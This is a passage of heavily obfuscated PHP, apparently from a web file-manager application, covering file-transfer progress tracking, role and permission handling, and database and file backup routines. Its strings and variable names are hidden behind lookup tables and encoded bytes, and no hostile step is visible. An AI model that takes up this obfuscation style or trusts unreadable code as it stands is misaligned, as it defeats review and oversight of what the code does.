Hook::unbind($¨¼‰­Ò[1735], array($this, $¨¼‰­Ò[1736])); Hook::unbind($¨¼‰­Ò[1281], array($this, $¨¼‰­Ò[1737])); Hook::unbind($¨¼‰­Ò[1738], array($this, $¨¼‰­Ò[1739])); Hook::unbind($¨¼‰­Ò[646], array($this, $¨¼‰­Ò[1740])); Hook::unbind($¨¼‰­Ò[647], array($this, $¨¼‰­Ò[1741])); Hook::unbind($¨¼‰­Ò[653], array($this, $¨¼‰­Ò[1742])); Hook::unbind($¨¼‰­Ò[654], array($this, $¨¼‰­Ò[1743])); Hook::unbind($¨¼‰­Ò[649], array($this, $¨¼‰­Ò[1744])); Hook::unbind($¨¼‰­Ò[651], array($this, $¨¼‰­Ò[1745])); Hook::unbind($¨¼‰­Ò[615], array($this, $¨¼‰­Ò[1746])); Hook::unbind($¨¼‰­Ò[612], array($this, $¨¼‰­Ò[1746])); Hook::unbind($¨¼‰­Ò[617], array($this, $¨¼‰­Ò[1746])); Hook::unbind($¨¼‰­Ò[619], array($this, $¨¼‰­Ò[1746])); Hook::unbind($¨¼‰­Ò[621], array($this, $¨¼‰­Ò[1746])); Hook::unbind($¨¼‰­Ò[1747], array($this, $¨¼‰­Ò[1748])); Hook::unbind($¨¼‰­Ò[637], array($this, $¨¼‰­Ò[1749])); Hook::unbind($¨¼‰­Ò[1750], array($this, $¨¼‰­Ò[1751])); Hook::unbind($¨¼‰­Ò[1752], array($this, $¨¼‰­Ò[1753])); Hook::unbind($¨¼‰­Ò[1754], array($this, $¨¼‰­Ò[1755])); } public function copyMoveStart($…¥ú, $­€ñÅ›â, $ÔòÑ’Ñ¢, $ºÜÄ…Ô) { $±ƒì²• =& $_SERVER[íû‘ş´]; self::log($±ƒì²•[1765] . $­€ñÅ›â . $±ƒì²•[70] . $ºÜÄ…Ô); $§“œÈ„Œ = rtrim(TEMP_FILES, $±ƒì²•[8]); if (substr($­€ñÅ›â, 0, strlen($§“œÈ„Œ)) == $§“œÈ„Œ) { return; } if (substr($ºÜÄ…Ô, 0, strlen($§“œÈ„Œ)) == $§“œÈ„Œ) { return; } $“Óµ‰×æ =& $this->task; $“Óµ‰×æ[$±ƒì²•[1766]] = KodIO::transferType($…¥ú, $ÔòÑ’Ñ¢); $this->update(); } public function updateAfter() { $°¦Æ¢•‡ =& $_SERVER[íû‘ş´]; $™›ş¥»â =& $this->task; if (!$™›ş¥»â[$°¦Æ¢•‡[822]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($™›ş¥»â[$°¦Æ¢•‡[1766]] == $°¦Æ¢•‡[1373]) { return; } self::updateTask($™›ş¥»â); } private static function updateTask(&$—Ï‡÷½Ë) { $ŸÕï€³ =& $_SERVER[íû‘ş´]; if ($—Ï‡÷½Ë[$ŸÕï€³[1766]] == $ŸÕï€³[1252] || $—Ï‡÷½Ë[$ŸÕï€³[1766]] == $ŸÕï€³[107]) { if ($—Ï‡÷½Ë[$ŸÕï€³[1760]]) { $—Ï‡÷½Ë[$ŸÕï€³[1763]] = $—Ï‡÷½Ë[$ŸÕï€³[1762]] + $—Ï‡÷½Ë[$ŸÕï€³[1759]]; } } else { if ($—Ï‡÷½Ë[$ŸÕï€³[1766]] == $ŸÕï€³[1374]) { if ($—Ï‡÷½Ë[$ŸÕï€³[1760]] == $ŸÕï€³[1252]) { $—Ï‡÷½Ë[$ŸÕï€³[1763]] = $—Ï‡÷½Ë[$ŸÕï€³[1762]] + $—Ï‡÷½Ë[$ŸÕï€³[1759]] * 0.5; } else { if ($—Ï‡÷½Ë[$ŸÕï€³[1760]] == $ŸÕï€³[107]) { $—Ï‡÷½Ë[$ŸÕï€³[1763]] = $—Ï‡÷½Ë[$ŸÕï€³[1762]] + $—Ï‡÷½Ë[$ŸÕï€³[1758]] * 0.5 + $—Ï‡÷½Ë[$ŸÕï€³[1759]] * 0.5; } } } } $—Ï‡÷½Ë[$ŸÕï€³[1707]] = $—Ï‡÷½Ë[$ŸÕï€³[1763]] / $—Ï‡÷½Ë[$ŸÕï€³[822]]; if ($—Ï‡÷½Ë[$ŸÕï€³[1707]] > 0) { $êç¦ÖŒò = timeFloat() - $—Ï‡÷½Ë[$ŸÕï€³[1709]] - $—Ï‡÷½Ë[$ŸÕï€³[1712]]; $—Ï‡÷½Ë[$ŸÕï€³[1713]] = $êç¦ÖŒò * (1 - $—Ï‡÷½Ë[$ŸÕï€³[1707]]) / $—Ï‡÷½Ë[$ŸÕï€³[1707]]; } } public function addPath($ÁÌ™ÄŸœ) { $²³—¶ş˜ =& $_SERVER[íû‘ş´]; if (!$ÁÌ™ÄŸœ) { return; } $Ø¤¨¾î¤ =& $this->task; $›¢·Ôğ¸ = IO::infoWithChildren($ÁÌ™ÄŸœ); $¡‘¦³è = $Ø¤¨¾î¤[$²³—¶ş˜[1767]] ? $Ø¤¨¾î¤[$²³—¶ş˜[1767]][$²³—¶ş˜[1768]] : 0; $Ø¤¨¾î¤[$²³—¶ş˜[1767]] = array($²³—¶ş˜[1768] => $¡‘¦³è + 1, $²³—¶ş˜[471] => $›¢·Ôğ¸[$²³—¶ş˜[32]], $²³—¶ş˜[84] => $›¢·Ôğ¸[$²³—¶ş˜[84]], $²³—¶ş˜[561] => $›¢·Ôğ¸[$²³—¶ş˜[561]] ? $›¢·Ôğ¸[$²³—¶ş˜[561]] : $›¢·Ôğ¸[$²³—¶ş˜[84]]); if ($›¢·Ôğ¸[$²³—¶ş˜[33]] == $²³—¶ş˜[214]) { $Ø¤¨¾î¤[$²³—¶ş˜[845]] += 1; } else { $Ø¤¨¾î¤[$²³—¶ş˜[845]] += $›¢·Ôğ¸[$²³—¶ş˜[79]][$²³—¶ş˜[77]]; if ($›¢·Ôğ¸[$²³—¶ş˜[181]]) { $Ø¤¨¾î¤[$²³—¶ş˜[845]] += $›¢·Ôğ¸[$²³—¶ş˜[79]][$²³—¶ş˜[78]] + 1; } } $Ø¤¨¾î¤[$²³—¶ş˜[822]] += $›¢·Ôğ¸[$²³—¶ş˜[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($üíÜ‚æµ) { } public function sourceAddHashEnd($§±¾ï»Ü) { } public function sourceAddFileStart($ÅĞ¾É£®) { $‹æöà÷ó =& $_SERVER[íû‘ş´]; $ËÍ¼®…• =& $this->task; $ËÍ¼®…•[$‹æöà÷ó[1758]] = $ÅĞ¾É£®[$‹æöà÷ó[76]]; $ËÍ¼®…•[$‹æöà÷ó[1756]] = $ÅĞ¾É£®[$‹æöà÷ó[32]]; $ËÍ¼®…•[$‹æöà÷ó[1122]] = $ÅĞ¾É£®[$‹æöà÷ó[32]]; $ËÍ¼®…•[$‹æöà÷ó[1769]] = $ÅĞ¾É£®[$‹æöà÷ó[84]]; $this->update(); } public function sourceAddFileEnd($€¦¸´ã—) { $€öô¯éù =& $_SERVER[íû‘ş´]; $‡‡º‡¼¨ =& $this->task; $‡‡º‡¼¨[$€öô¯éù[1763]] += $€¦¸´ã—[$€öô¯éù[76]]; $‡‡º‡¼¨[$€öô¯éù[1769]] = $€¦¸´ã—[$€öô¯éù[84]]; $this->update(1); } public function copyFileStart($òçÄşãŒ, $Â§´¢Éö, $·²§œ¶­, $¸™Ğ»ß, $ßà ²³Ä, $‡õİ¹Ú) { $®Ş–Í·· =& $_SERVER[íû‘ş´]; $­£Ş‘Ü  = $ßà ²³Ä; if ($­£Ş‘Ü  == $GLOBALS[$®Ş–Í··[1770]]) { $­£Ş‘Ü  = $GLOBALS[$®Ş–Í··[1771]]; } $GLOBALS[$®Ş–Í··[1771]] = $ßà ²³Ä; $GLOBALS[$®Ş–Í··[1770]] = $‡õİ¹Ú; $Ô¸ÄóÇ· =& $this->task; $Ô¸ÄóÇ·[$®Ş–Í··[1756]] = $­£Ş‘Ü ; $Ô¸ÄóÇ·[$®Ş–Í··[1758]] = (int) $òçÄşãŒ->size($Â§´¢Éö); $Ô¸ÄóÇ·[$®Ş–Í··[1759]] = 0; $Ô¸ÄóÇ·[$®Ş–Í··[1122]] = $®Ş–Í··[12]; $Ô¸ÄóÇ·[$®Ş–Í··[1760]] = $®Ş–Í··[12]; $Ô¸ÄóÇ·[$®Ş–Í··[1761]] = 0; $‘¥İ‹™‡ = $Ô¸ÄóÇ·[$®Ş–Í··[1758]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ô¸ÄóÇ·[$®Ş–Í··[443]] . $®Ş–Í··[1772]); if ($‘¥İ‹™‡ && file_exists(get_path_father($¸™Ğ»ß))) { Cache::set($Ô¸ÄóÇ·[$®Ş–Í··[443]] . $®Ş–Í··[1772], $¸™Ğ»ß); $Ô¸ÄóÇ·[$®Ş–Í··[1729]] = array($®Ş–Í··[1773], $®Ş–Í··[1774]); } $this->update(0, $‘¥İ‹™‡); } public static function updateCopyLocalFileSize($•˜Øéƒƒ) { $öğú†‡ß =& $_SERVER[íû‘ş´]; $ÓñÔïĞï = Cache::get($•˜Øéƒƒ[$öğú†‡ß[443]] . $öğú†‡ß[1772]); if (!$ÓñÔïĞï || !file_exists($ÓñÔïĞï)) { return $•˜Øéƒƒ; } $•˜Øéƒƒ[$öğú†‡ß[1759]] = @filesize($ÓñÔïĞï); $•˜Øéƒƒ[$öğú†‡ß[1763]] += $•˜Øéƒƒ[$öğú†‡ß[1759]]; self::updateTask($•˜Øéƒƒ); return $•˜Øéƒƒ; } public function copyFileEnd($Ë×¨ã, $Ë¯¡×²ˆ, $ÀœşÇĞ, $ÖêÊÕØÎ, $«öÜõ‹¼, $»æ¡é¹…) { $×¨°±ß¾ =& $_SERVER[íû‘ş´]; $ó¾ö†ÜŒ =& $this->task; $ó¾ö†ÜŒ[$×¨°±ß¾[1759]] = $ó¾ö†ÜŒ[$×¨°±ß¾[1758]]; $ó¾ö†ÜŒ[$×¨°±ß¾[1760]] = $×¨°±ß¾[12]; unset($ó¾ö†ÜŒ[$×¨°±ß¾[1729]]); if ($«öÜõ‹¼ == $ó¾ö†ÜŒ[$×¨°±ß¾[1756]]) { $ó¾ö†ÜŒ[$×¨°±ß¾[1762]] += $ó¾ö†ÜŒ[$×¨°±ß¾[1758]]; $ó¾ö†ÜŒ[$×¨°±ß¾[1763]] = $ó¾ö†ÜŒ[$×¨°±ß¾[1762]]; $éúä†Í = 1; if (isset($ó¾ö†ÜŒ[$×¨°±ß¾[1769]]) && $ó¾ö†ÜŒ[$×¨°±ß¾[1769]] == $Ë¯¡×²ˆ) { $éúä†Í = 0; } $this->update($éúä†Í); } else { $this->update(); $ó¾ö†ÜŒ[$×¨°±ß¾[1759]] = 0; } Cache::remove($ó¾ö†ÜŒ[$×¨°±ß¾[443]] . $×¨°±ß¾[1772]); self::log($×¨°±ß¾[1775] . $Ë¯¡×²ˆ . $×¨°±ß¾[70] . $ÖêÊÕØÎ . $×¨°±ß¾[246] . $«öÜõ‹¼ . $×¨°±ß¾[1776] . $ó¾ö†ÜŒ[$×¨°±ß¾[1756]]); } public function updateFileEnd($üÒ·Û™ú, $ »ğŠÇ˜) { $ä­§ò¡œ =& $_SERVER[íû‘ş´]; $›âçı´„ =& $this->task; $›âçı´„[$ä­§ò¡œ[1756]] = $üÒ·Û™ú; $›âçı´„[$ä­§ò¡œ[1758]] = $ »ğŠÇ˜; $›âçı´„[$ä­§ò¡œ[1762]] += $ »ğŠÇ˜; $›âçı´„[$ä­§ò¡œ[1763]] = $›âçı´„[$ä­§ò¡œ[1762]]; $this->update(1); self::log($ä­§ò¡œ[1777] . $üÒ·Û™ú); } public function sourceModelCopy($ğıˆÃÔ) { $³—ÆÙ‡¸ =& $_SERVER[íû‘ş´]; $œŸ—¥Üİ = $ğıˆÃÔ[0]; $â…€å¦À = $ğıˆÃÔ[1]; $í¤¥ñ• =& $this->task; $this->sourceModelCopyFlag = !0; $Ø´… = 0; switch ($œŸ—¥Üİ) { case $³—ÆÙ‡¸[613]: $Ø´… = 1; break; case $³—ÆÙ‡¸[616]: $í¤¥ñ•[$³—ÆÙ‡¸[1756]] = $â…€å¦À[$³—ÆÙ‡¸[32]]; break; case $³—ÆÙ‡¸[618]: $Ø´… = intval($ğıˆÃÔ[$³—ÆÙ‡¸[424]] * 0.4); break; case $³—ÆÙ‡¸[620]: $Ø´… = intval($ğıˆÃÔ[$³—ÆÙ‡¸[424]] * 0.2); break; case $³—ÆÙ‡¸[622]: $Ø´… = intval($ğıˆÃÔ[$³—ÆÙ‡¸[424]] * 0.4); break; } $this->update($Ø´…); $this->sourceModelCopyFlag = !1; } public function sourceRemove($·µ®Äº, $öí£³Î) { $™¢àÔØø =& $_SERVER[íû‘ş´]; $this->sourceModelCopyFlag = !0; $°­éæã = 1; if (isset($·µ®Äº[$™¢àÔØø[79]])) { $°­éæã = $·µ®Äº[$™¢àÔØø[79]][$™¢àÔØø[77]]; $°­éæã = $°­éæã + $·µ®Äº[$™¢àÔØø[79]][$™¢àÔØø[78]] + 1; } $this->update($°­éæã); $this->sourceModelCopyFlag = !1; } public function sourceMove($úÒı®é†) { $this->sourceRemove($úÒı®é†, !1); } public function curlProgress($ùÑ¡Åû¥, $°Š«ê²Ô, $øÕñªÈ­, $ïÓÆÎÙ˜, $æ£Ó¸¥Å) { $¢õä¯•ö =& $_SERVER[íû‘ş´]; $í‡ôï–ª =& $this->task; if ($æ£Ó¸¥Å > 0) { $í‡ôï–ª[$¢õä¯•ö[1122]] = $¢õä¯•ö[1778]; $í‡ôï–ª[$¢õä¯•ö[1760]] = $¢õä¯•ö[107]; if ($í‡ôï–ª[$¢õä¯•ö[1758]]) { $í‡ôï–ª[$¢õä¯•ö[1759]] = $æ£Ó¸¥Å; } if ($í‡ôï–ª[$¢õä¯•ö[1761]]) { $í‡ôï–ª[$¢õä¯•ö[1759]] = $æ£Ó¸¥Å + $í‡ôï–ª[$¢õä¯•ö[1761]]; } } else { if ($øÕñªÈ­ > 0) { if ($í‡ôï–ª[$¢õä¯•ö[1758]] == $°Š«ê²Ô) { $í‡ôï–ª[$¢õä¯•ö[1759]] = $øÕñªÈ­; $í‡ôï–ª[$¢õä¯•ö[1122]] = $¢õä¯•ö[1779]; $í‡ôï–ª[$¢õä¯•ö[1760]] = $¢õä¯•ö[1252]; } } } $this->update(); } public function curlProgressStart($½ûœ„ãÙ) { } public function curlProgressEnd($‘”¥µÙ›) { $íáå¨ =& $_SERVER[íû‘ş´]; $ êïÒƒŒ =& $this->task; $¾òå©æÎ = curl_getinfo($‘”¥µÙ›); $ê¶Ç«êÎ = $¾òå©æÎ[$íáå¨[1780]]; if ($ê¶Ç«êÎ == -1) { $ê¶Ç«êÎ = $¾òå©æÎ[$íáå¨[1781]]; } if ($ êïÒƒŒ[$íáå¨[1760]] == $íáå¨[107] && $ê¶Ç«êÎ) { $ êïÒƒŒ[$íáå¨[1761]] += $ê¶Ç«êÎ; } $this->update(); } } goto A¹Ğ„Ğ´ùƒ; Eµ„ª¯¨£˜: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\x65\x6d\x5f\x6f\160\164\x69\x6f\x6e"; protected $jsonField = array("\155\145\156\165", "\162\x6f\154\x65", "\x72\x6f\x6c\145\107\x72\157\165\160", "\162\x65\x67\x69\x73\164", "\145\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($Ì÷æò„¬) { return "\123\171\x73\x74\145\155\x4f\x70\x74\151\157\156\x5f{$Ì÷æò„¬}"; } protected function optionDefault($ôÙ°õÚ = '') { $‹ıÉ‚ =& $_SERVER[íû‘ş´]; if ($ôÙ°õÚ == $‹ıÉ‚[12]) { return $GLOBALS[$‹ıÉ‚[6]][$‹ıÉ‚[425]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\162\x6f\x6c\145\114\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\x61\165\x74\x68", "\x6c\141\142\145\154", "\x64\151\163\x70\x6c\x61\171", "\163\x79\x73\x74\145\x6d", "\x64\145\x73\143", "\151\147\156\x6f\162\145\105\170\164", "\151\147\156\x6f\x72\145\x46\151\x6c\145\x53\151\172\x65", "\x61\x64\x6d\x69\156\x69\163\x74\x72\141\164\x6f\x72", "\x73\157\162\164"); public function listData($şÁ©øÓ´ = false, $İû–ü¶Ñ = "\x73\157\162\x74", $Á ö±áù = false) { $„¸Êòı” =& $_SERVER[íû‘ş´]; $‰ƒÆş¯‡ = parent::listData($şÁ©øÓ´, $İû–ü¶Ñ, $Á ö±áù); if (!$şÁ©øÓ´) { foreach ($‰ƒÆş¯‡ as $óí”£ªĞ => $«ÖÑØ¼ú) { if ($«ÖÑØ¼ú[$„¸Êòı”[2105]] == 1) { $‰ƒÆş¯‡[$óí”£ªĞ][$„¸Êòı”[503]] = LNG($„¸Êòı”[2344]); } } } return $‰ƒÆş¯‡; } public function update($èú‰Ã, $“Ñşñõ™) { $Í’î»ûı =& $_SERVER[íû‘ş´]; $şÔ‹ö¯™ = parent::listData($èú‰Ã); $ç÷‹Šî… = $this->findByName($“Ñşñõ™[$Í’î»ûı[32]]); if (!$şÔ‹ö¯™ || $ç÷‹Šî… && $ç÷‹Šî…[$Í’î»ûı[443]] != $şÔ‹ö¯™[$Í’î»ûı[443]]) { return !1; } if ($ç÷‹Šî…[$Í’î»ûı[2105]] == 1) { $“Ñşñõ™ = array($Í’î»ûı[32] => $“Ñşñõ™[$Í’î»ûı[32]], $Í’î»ûı[1926] => $“Ñşñõ™[$Í’î»ûı[1926]]); } $this->filterAuth($“Ñşñõ™[$Í’î»ûı[464]]); return parent::update($èú‰Ã, $“Ñşñõ™); } public function remove($×æÌì) { $ÌæãÀ»‹ = parent::listData($×æÌì); if (!$ÌæãÀ»‹ || $ÌæãÀ»‹[$_SERVER[íû‘ş´][179]]) { return !1; } return parent::remove($×æÌì); } public function add($å‹¡ÑÁ) { $åˆÁƒÀ =& $_SERVER[íû‘ş´]; $©ùáÒÖ´ = $å‹¡ÑÁ[$åˆÁƒÀ[32]]; if ($this->findByName($©ùáÒÖ´)) { return !1; } $³¼Ë›ù = array($åˆÁƒÀ[471] => $©ùáÒÖ´, $åˆÁƒÀ[1909] => $åˆÁƒÀ[12], $åˆÁƒÀ[1905] => $åˆÁƒÀ[1913], $åˆÁƒÀ[2345] => 1, $åˆÁƒÀ[1908] => 0, $åˆÁƒÀ[2346] => 0, $åˆÁƒÀ[1907] => $this->getSort()); $å‹¡ÑÁ = array_merge($³¼Ë›ù, $å‹¡ÑÁ); $this->filterAuth($å‹¡ÑÁ[$åˆÁƒÀ[464]]); return parent::insert($å‹¡ÑÁ); } private function getSort() { $ş×üúÖ =& $_SERVER[íû‘ş´]; $ëï—Şßë = parent::listData(); $Û£‹èè¥ = array_to_keyvalue($ëï—Şßë, $ş×üúÖ[12], $ş×üúÖ[1927]); return empty($Û£‹èè¥) ? 0 : max($Û£‹èè¥) + 1; } private function filterAuth(&$¤ö—íĞå) { $ö¨—»ãª =& $_SERVER[íû‘ş´]; $ğŸ’°â = array(); $æÉå‘û§ = array_filter(explode($ö¨—»ãª[50], $¤ö—íĞå)); foreach ($æÉå‘û§ as $¤ö—íĞå) { $¡¥Ï™‡© = explode($ö¨—»ãª[10], $¤ö—íĞå); if ($¡¥Ï™‡©[0] == $ö¨—»ãª[2347] && $¡¥Ï™‡©[1] != $ö¨—»ãª[1248]) { $ÅõµÅÕã = $¡¥Ï™‡©[0] . $ö¨—»ãª[10] . $¡¥Ï™‡©[1] . $ö¨—»ãª[2348]; if (!in_array($ÅõµÅÕã, $æÉå‘û§)) { $ğŸ’°â[] = $ÅõµÅÕã; } } $ğŸ’°â[] = $¤ö—íĞå; } $¤ö—íĞå = implode($ö¨—»ãª[50], $ğŸ’°â); } public function findRoleDefault() { $á…Ó¼” =& $_SERVER[íû‘ş´]; $¬•¢ßŠÖ = parent::listData(); $¦´ã§Ğ¹ = !1; foreach ($¬•¢ßŠÖ as $‚¢—©Ñƒ) { if (!$‚¢—©Ñƒ || $‚¢—©Ñƒ[$á…Ó¼”[1925]] == $á…Ó¼”[212] || $‚¢—©Ñƒ[$á…Ó¼”[2105]] == 1) { continue; } if (strstr($‚¢—©Ñƒ[$á…Ó¼”[464]], $á…Ó¼”[2349])) { continue; } if (!strstr($‚¢—©Ñƒ[$á…Ó¼”[464]], $á…Ó¼”[2350])) { continue; } if (!$¦´ã§Ğ¹) { $¦´ã§Ğ¹ = $‚¢—©Ñƒ; continue; } $ò¸Á¤Ë© = explode($á…Ó¼”[50], $¦´ã§Ğ¹[$á…Ó¼”[464]]); $î­·Óâñ = explode($á…Ó¼”[50], $‚¢—©Ñƒ[$á…Ó¼”[464]]); if (count($ò¸Á¤Ë©) > count($î­·Óâñ)) { $¦´ã§Ğ¹ = $‚¢—©Ñƒ; } } return $¦´ã§Ğ¹ ? $¦´ã§Ğ¹[$á…Ó¼”[443]] : $á…Ó¼”[12]; } public function sort($¢û¾†Àá, $®ıÊÌ¬‚) { return parent::update($¢û¾†Àá, $®ıÊÌ¬‚); } } goto D‚ã¥ïö»; DßÃÎ£µ˜: define($_SERVER[íû‘ş´][285], 1); define($_SERVER[íû‘ş´][286], 0); define($_SERVER[íû‘ş´][287], 2); goto d©ôËôôœÅ; a„Ù¯Îö“ê: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $€¥é«± =& $_SERVER[íû‘ş´]; $¯ß€§Õİ = Backup::get(); self::$io = $¯ß€§Õİ[$€¥é«±[810]]; self::$name = $¯ß€§Õİ[$€¥é«±[32]]; $â¾‡¯õ… = new DbManage(); $¼Ë¿Œ¦ä = $â¾‡¯õ…->dbType(); $¢˜ú‹µ€ = array($€¥é«±[835] => $¼Ë¿Œ¦ä, $€¥é«±[836] => time()); Backup::set($¢˜ú‹µ€); $î‘èØ = $this->tmpFilesPath() . $€¥é«±[837] . self::$name . $€¥é«±[8]; del_dir($î‘èØ); mk_dir($î‘èØ); $¼æ²›âß = $¦¹„ŸœÄ = 0; $å——‘ú = new Task($€¥é«±[838], $€¥é«±[839], 0, LNG($€¥é«±[840]) . $€¥é«±[841] . LNG($€¥é«±[842])); try { $æ”º¯¾¦ = $â¾‡¯õ…->db()->getTables(); } catch (Exception $õ‡Ğ›ø) { $å——‘ú->end(); return !1; } $æ”º¯¾¦ = array_diff($æ”º¯¾¦, array($€¥é«±[843], $€¥é«±[844])); foreach ($æ”º¯¾¦ as $“ğ²¡¸) { $¼æ²›âß += $â¾‡¯õ…->model($“ğ²¡¸)->count(); } $å——‘ú->task[$€¥é«±[845]] = $¼æ²›âß; $GLOBALS[$€¥é«±[846]] = self::$name; foreach ($æ”º¯¾¦ as $“ğ²¡¸) { $«™û·ß¿ = $î‘èØ . $“ğ²¡¸ . $€¥é«±[847]; $ØÓ÷·ùÔ = null; if ($“ğ²¡¸ == $€¥é«±[848] && (!isset($¯ß€§Õİ[$€¥é«±[813]]) || $¯ß€§Õİ[$€¥é«±[813]] == $€¥é«±[212])) { $ØÓ÷·ùÔ = self::$io; } $¦¹„ŸœÄ += $â¾‡¯õ…->sqlFromDb($“ğ²¡¸, $«™û·ß¿, $å——‘ú, $ØÓ÷·ùÔ); } unset($GLOBALS[$€¥é«±[846]]); $å——‘ú->end(); if ($¦¹„ŸœÄ > $¼æ²›âß) { $¼æ²›âß = $¦¹„ŸœÄ; } $¢˜ú‹µ€ = array($€¥é«±[835] => $¼Ë¿Œ¦ä, $€¥é«±[832] => 1, $€¥é«±[849] => $¼æ²›âß, $€¥é«±[850] => $¦¹„ŸœÄ, $€¥é«±[851] => time()); Backup::set($¢˜ú‹µ€); if ($¼æ²›âß - $¦¹„ŸœÄ > 0) { $›°º¤µš = $€¥é«±[852]; if (stristr(I18n::getType(), $€¥é«±[853])) { $›°º¤µš = $€¥é«±[854]; } write_log(array($›°º¤µš, $¢˜ú‹µ€), $€¥é«±[839]); return !1; } return !0; } private function tmpFilesPath() { $œòÈĞÊƒ =& $_SERVER[íû‘ş´]; $ğÁãò”‘ = TEMP_FILES; if ($GLOBALS[$œòÈĞÊƒ[6]][$œòÈĞÊƒ[89]][$œòÈĞÊƒ[855]]) { $ğÁãò”‘ = $GLOBALS[$œòÈĞÊƒ[6]][$œòÈĞÊƒ[89]][$œòÈĞÊƒ[855]]; if (!mk_dir($ğÁãò”‘) || !is_writable($ğÁãò”‘) || !IO::mkfile($ğÁãò”‘ . $œòÈĞÊƒ[856])) { $ğÁãò”‘ = TEMP_FILES; } } return $ğÁãò”‘; } } class BackupDbFile { public function __construct() { } public function index() { $şûºÒá„ =& $_SERVER[íû‘ş´]; $‡ïüü—Ë = Backup::get(); $¤Ó¡Å = $‡ïüü—Ë[$şûºÒá„[32]]; $Ù©«¡Ö„ = $this->tmpFilesPath() . "\142\141\x63\153\165\160\x5f{$¤Ó¡Å}\57"; $ãİÛá²ú = $this->backupPath($‡ïüü—Ë); if (!($ãİÛá²ú = IO::mkdir($ãİÛá²ú))) { return !1; } $Ì° õå© = IO::listPath($Ù©«¡Ö„); $”Ğ²¢Šî = isset($Ì° õå©[$şûºÒá„[83]]) ? $Ì° õå©[$şûºÒá„[83]] : array(); $¼é—ÄÈ = array_sum(array_column($”Ğ²¢Šî, $şûºÒá„[76])); if (!$¼é—ÄÈ) { return !1; } $ùæô ² = array($şûºÒá„[857] => $¼é—ÄÈ, $şûºÒá„[858] => time()); Backup::set($ùæô ²); $™œÏæï = new TaskFileTransfer($şûºÒá„[859], $şûºÒá„[839], count($”Ğ²¢Šî), LNG($şûºÒá„[840]) . $şûºÒá„[430] . LNG($şûºÒá„[842]) . $şûºÒá„[860]); $™œÏæï->task[$şûºÒá„[822]] = $¼é—ÄÈ; foreach ($Ì° õå©[$şûºÒá„[83]] as $³ğ¢å¬±) { $’«¹Æ = IO::move($³ğ¢å¬±[$şûºÒá„[84]], $ãİÛá²ú); if (!$’«¹Æ) { $™œÏæï->end(); $ªã¿á” = IO::getLastError($şûºÒá„[861] . $³ğ¢å¬±[$şûºÒá„[84]] . $şûºÒá„[862] . $ãİÛá²ú . $şûºÒá„[165]); write_log($ªã¿á”, $şûºÒá„[839]); return !1; } } $Ü¢‡¯ı¯ = new DbManage(); $áÇ£óÎ² = $Ü¢‡¯ı¯->getSqlFile(); if (!$áÇ£óÎ²[$şûºÒá„[863]] || !$áÇ£óÎ²[$şûºÒá„[13]]) { return !1; } IO::move($áÇ£óÎ²[$şûºÒá„[863]], $ãİÛá²ú); IO::move($áÇ£óÎ²[$şûºÒá„[13]], $ãİÛá²ú); $™œÏæï->end(); $ùæô ² = array($şûºÒá„[864] => $¼é—ÄÈ, $şûºÒá„[865] => time()); Backup::set($ùæô ²); return !0; } private function backupPath($ÏÕù„îª) { $å…®ÆšÛ =& $_SERVER[íû‘ş´]; $â¤ñÃÑî = $ÏÕù„îª[$å…®ÆšÛ[32]]; $ƒ…¨×ğó = Model($å…®ÆšÛ[829])->get($å…®ÆšÛ[830]); $Ö¡ï…¨ = substr(md5($å…®ÆšÛ[831] . $ƒ…¨×ğó . $â¤ñÃÑî), 0, 8); return "\173\x69\x6f\72{$ÏÕù„îª[$å…®ÆšÛ[810]]}\x7d\x2f\x64\x61\164\141\x62\x61\x73\x65\x2f\142\x61\x63\x6b\x75\x70\57" . $â¤ñÃÑî . $å…®ÆšÛ[11] . $Ö¡ï…¨; } private function tmpFilesPath() { $£Œ£¹’ =& $_SERVER[íû‘ş´]; $«Â€–‹ = TEMP_FILES; if ($GLOBALS[$£Œ£¹’[6]][$£Œ£¹’[89]][$£Œ£¹’[855]]) { $«Â€–‹ = $GLOBALS[$£Œ£¹’[6]][$£Œ£¹’[89]][$£Œ£¹’[855]]; if (!mk_dir($«Â€–‹) || !is_writable($«Â€–‹) || !IO::mkfile($«Â€–‹ . $£Œ£¹’[856])) { $«Â€–‹ = TEMP_FILES; } } return $«Â€–‹; } } class BackupFile { public function __construct() { } public function index() { $ş£ôù¢ê = Backup::get(); $†Æ¼Ğº = $ş£ôù¢ê[$_SERVER[íû‘ş´][337]][$_SERVER[íû‘ş´][214]][$_SERVER[íû‘ş´][518]]; $‰«ĞÙßÚ = array($_SERVER[íû‘ş´][519] => array($_SERVER[íû‘ş´][866], $†Æ¼Ğº), $_SERVER[íû‘ş´][867] => array($_SERVER[íû‘ş´][375], $ş£ôù¢ê[$_SERVER[íû‘ş´][810]])); $×ÇÄæôô = (int) Model($_SERVER[íû‘ş´][848])->where($‰«ĞÙßÚ)->count($_SERVER[íû‘ş´][518]); $ßœ‡Úö = (int) Model($_SERVER[íû‘ş´][848])->where($‰«ĞÙßÚ)->sum($_SERVER[íû‘ş´][76]); $ø”ËŸäÜ = new TaskFileTransfer($_SERVER[íû‘ş´][868], $_SERVER[íû‘ş´][839], $×ÇÄæôô, LNG($_SERVER[íû‘ş´][840]) . $_SERVER[íû‘ş´][841] . LNG($_SERVER[íû‘ş´][869])); $ø”ËŸäÜ->task[$_SERVER[íû‘ş´][822]] = $ßœ‡Úö; $ØÑ¯š¾ = array($_SERVER[íû‘ş´][870] => $×ÇÄæôô, $_SERVER[íû‘ş´][871] => $ßœ‡Úö, $_SERVER[íû‘ş´][872] => time()); Backup::set($ØÑ¯š¾); $¼§…“©„ = !0; $¾§›§Ğİ = $this->storeIds(); $§â‡Ò´· = 1; $Î¯ôŸƒ  = 1000; $Ë´£Ô = $í´ëñ€ = 0; $¬ÚÎæŒº = array(); $½ãäŠş = $—‹„ı— = 0; do { $Ÿ¼àı¡ã = $_SERVER[íû‘ş´][873]; $É–Şá«² = 